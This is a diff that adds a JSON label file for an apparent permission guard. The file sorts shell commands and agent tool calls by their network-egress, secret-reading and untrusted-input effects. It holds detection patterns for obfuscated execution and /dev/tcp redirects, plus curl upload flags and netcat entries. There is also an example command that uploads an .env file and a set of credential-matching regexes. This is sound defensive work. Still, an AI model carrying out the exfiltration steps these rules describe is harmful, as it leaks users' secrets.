@@ -1,0 +1,106 @@
+{
+  "//": "The RUNTIME label pack — argument-aware, for polycheck guard. It EXTENDS data/claude-code.labels.json (which labels permission RULES like Bash(curl:*)); this file labels concrete INVOCATIONS like `curl -T .env https://x`. Same status as its parent: a NAMED TRUST OBLIGATION, not a proved thing. The difference in stakes is stated in the spec — because the guard can only ever ADD a gate (never emit 'allow'), a mislabeled invocation is a gate that fails to fire, not a bypass of anything the user already had.",
+  "version": "0.1.0",
+
+  "//escalation": "Shell constructs that make the rest of the command string meaningless as evidence. Any hit forces the declared worst case and sets parse.ok=false, exactly as the static labeler treats bashArbitraryExecution. This is the reason an obfuscated command yields a PROMPT rather than a hole.",
+  "escalation": [
+    { "id": "esc/cmd-substitution", "pattern": "\\$\\(|`", "why": "command substitution — the real command is computed at run time" },
+    { "id": "esc/eval", "pattern": "\\beval\\b", "why": "eval executes a string built at run time" },
+    { "id": "esc/source", "pattern": "\\b(source|\\.)\\s+\\S", "why": "sources a file whose contents are not visible here" },
+    { "id": "esc/var-in-exec-position", "pattern": "^\\s*\\$\\{?\\w+", "why": "the executable itself is a variable" },
+    { "id": "esc/process-substitution", "pattern": "<\\(|>\\(", "why": "process substitution runs a nested command" },
+    { "id": "esc/base64-into-shell", "pattern": "base64\\s+(-d|--decode)", "why": "decoded bytes are typically piped into a shell" },
+    { "id": "esc/redirect-to-tcp", "pattern": ">\\s*/dev/tcp/", "why": "a bare redirect to /dev/tcp is a network channel" }
+  ],
+
+  "//commands": "Per-executable rules. `effects` is unconditional; `*WhenArgMatches` adds an effect only when an argument matches; `hostFrom: url` extracts the network target for the providerKey. `subcommands` is consulted first when present. Anything not listed here is UNKNOWN and worst-cased — see unknownExecutable.",
+  "commands": {
+    "curl": {
+      "effects": ["egress", "untrusted"],
+      "sensitiveWhenArgMatches": ["(^|\\s)-T(\\s|$)", "--upload-file", "-d\\s*@", "--data(-binary|-raw)?\\s*@", "--form\\s+\\S*@"],
+      "hostFrom": "url"
+    },
+    "wget": { "effects": ["egress", "untrusted"], "sensitiveWhenArgMatches": ["--post-file"], "hostFrom": "url" },
+    "http": { "effects": ["egress", "untrusted"], "hostFrom": "url" },
+    "https": { "effects": ["egress", "untrusted"], "hostFrom": "url" },
+    "httpie": { "effects": ["egress", "untrusted"], "hostFrom": "url" },
+    "nc": { "effects": ["egress"], "hostFrom": "arg1" },
+    "ncat": { "effects": ["egress"], "hostFrom": "arg1" },
+    "netcat": { "effects": ["egress"], "hostFrom": "arg1" },
+    "telnet": { "effects": ["egress"], "hostFrom": "arg1" },
+    "scp": { "effects": ["egress", "sensitive"], "hostFrom": "arg1" },
+    "sftp": { "effects": ["egress", "sensitive"], "hostFrom": "arg1" },
+    "rsync": { "effects": ["egress", "sensitive"], "hostFrom": "arg1" },
+    "ssh": { "effects": ["egress", "sensitive"], "hostFrom": "arg1" },
+    "ftp": { "effects": ["egress"], "hostFrom": "arg1" },
+    "mail": { "effects": ["egress"] },
+    "sendmail": { "effects": ["egress"] },
+
+    "cat": { "sensitiveWhenPathArg": true },
+    "head": { "sensitiveWhenPathArg": true },
+    "tail": { "sensitiveWhenPathArg": true },
+    "less": { "sensitiveWhenPathArg": true },
+    "more": { "sensitiveWhenPathArg": true },
+    "strings": { "sensitiveWhenPathArg": true },
+    "printenv": { "effects": ["sensitive"] },
+    "env": { "effects": ["sensitive"], "//": "bare `env` dumps the environment; `env VAR=x cmd` is arbitrary execution and is caught by escalation upstream" },
+
+    "git": {
+      "subcommands": {
+        "push": { "effects": ["egress"], "hostFrom": "remote", "unrecoverableWhenArgMatches": ["--force(?!-with-lease)", "(^|\\s)\\+[\\w/]+:"] },
+        "clone": { "effects": ["untrusted"], "hostFrom": "arg1" },
+        "fetch": { "effects": ["untrusted"], "hostFrom": "remote" },
+        "pull": { "effects": ["untrusted"], "hostFrom": "remote" },
+        "status": {}, "diff": {}, "log": {}, "add": {}, "commit": {}, "checkout": {}, "branch": {}, "show": {}, "stash": {}
+      },
+      "unknownSubcommand": { "effects": [] }
+    },
+
+    "aws": {
+      "subcommands": {
+        "s3": { "effects": ["egress", "sensitive", "untrusted"] },
+        "s3api": { "effects": ["egress", "sensitive", "untrusted"] },
+        "secretsmanager": { "effects": ["sensitive"] },
+        "sts": { "effects": ["sensitive"] },
+        "configure": { "effects": ["sensitive"] },
+        "sns": { "effects": ["egress"] },
+        "sqs": { "effects": ["egress"] },
+        "lambda": { "effects": ["egress"] }
+      },
+      "unknownSubcommand": { "effects": ["egress"] }
+    },
+
+    "ls": {}, "pwd": {}, "echo": {}, "wc": {}, "sort": {}, "uniq": {}, "date": {}, "true": {}, "false": {},
+    "mkdir": {}, "cp": {}, "mv": {}, "touch": {}, "diff": {}, "which": {}, "basename": {}, "dirname": {},
+    "grep": { "sensitiveWhenPathArg": true },
+    "rg": { "sensitiveWhenPathArg": true },
+    "find": { "//": "find -exec is arbitrary execution and is caught by escalation" },
+    "sed": { "sensitiveWhenPathArg": true },
+    "jq": { "sensitiveWhenPathArg": true }
+  },
+
+  "//unknownExecutable": "The default that decides whether this product is honest. An executable we have no rule for could ingest, read secrets, or reach the network, so it is worst-cased and NAMED in the output so a user can add a rule. Quiet under-labeling is the failure mode that would make the ledger a lie.",
+  "unknownExecutable": { "effects": ["untrusted", "sensitive", "egress"], "certainty": "worst-case" },
+
+  "//tools": "Non-shell tools. Read/Grep/Glob resolve their concrete path against the parent pack's sensitivePaths — far sharper than the static labeler's glob-covers-exemplar test, because at runtime the real path is known.",
+  "tools": {
+    "Read":   { "sensitiveWhenPathMatches": "file_path" },
+    "Grep":   { "sensitiveWhenPathMatches": "path" },
+    "Glob":   { "effects": [] },
+    "Write":  { "effects": [] },
+    "Edit":   { "effects": [] },
+    "NotebookEdit": { "effects": [] },
+    "WebFetch":  { "effects": ["untrusted", "egress"], "hostFrom": "url" },
+    "WebSearch": { "effects": ["untrusted"] },
+    "Task":   { "effects": [], "//": "spawn; taint propagation is M3, not an effect here" }
+  },
+
+  "//secretEvidence": "M1 (observed basis) only — patterns that say returned BYTES were credential material, not merely that the path could have been. Unused at M0.",
+  "secretEvidence": [
+    { "id": "ev/aws-akid", "pattern": "\\bAKIA[0-9A-Z]{16}\\b" },
+    { "id": "ev/private-key", "pattern": "-----BEGIN [A-Z ]*PRIVATE KEY-----" },
+    { "id": "ev/slack", "pattern": "\\bxox[baprs]-[0-9A-Za-z-]{10,}" },
+    { "id": "ev/gh-token", "pattern": "\\bgh[pousr]_[A-Za-z0-9]{36,}" },
+    { "id": "ev/assignment", "pattern": "(?i)\\b(secret|token|password|passwd|api[_-]?key)\\b\\s*[:=]\\s*['\"]?[A-Za-z0-9/+_-]{16,}" }
+  ]
+}
